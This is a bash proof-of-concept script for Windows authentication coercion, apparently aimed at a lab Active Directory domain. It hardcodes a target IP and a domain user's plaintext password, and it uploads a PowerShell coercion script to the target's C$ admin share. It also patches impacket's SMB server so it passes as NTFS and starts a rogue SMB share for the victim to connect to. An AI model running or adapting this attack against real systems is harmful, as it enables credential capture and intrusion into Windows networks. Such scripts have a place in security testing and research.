#!/usr/bin/env bash
set -e

SHARE=/tmp/coerceshare
TARGET_IP=192.168.139.158
TARGET_CREDS='sevenkingdoms.local/cersei.lannister%il0vejaime'

mkdir -p "$SHARE"
cp poc/AppxManifest.xml "$SHARE/"
cp poc/Invoke-InstallServiceCoerce.ps1 "$SHARE/"

python3 -c "
import base64, pathlib
pathlib.Path('$SHARE/logo.png').write_bytes(
    base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==')
)
"

python3 -c "
import pathlib
pathlib.Path('$SHARE/dummy.exe').write_bytes(b'MZ' + b'\x00' * 510)
"

SMBS=$(python3 -c "import impacket.smbserver as s, os; print(os.path.abspath(s.__file__))")
sudo sed -i "s/b'XTFS'/b'NTFS'/g; s/'XTFS'/'NTFS'/g" "$SMBS"

smbclient //$TARGET_IP/C$ -U "$TARGET_CREDS" \
    -c 'put /tmp/coerceshare/Invoke-InstallServiceCoerce.ps1 Users\Public\poc.ps1'

sudo impacket-smbserver coerce "$SHARE" -smb2support
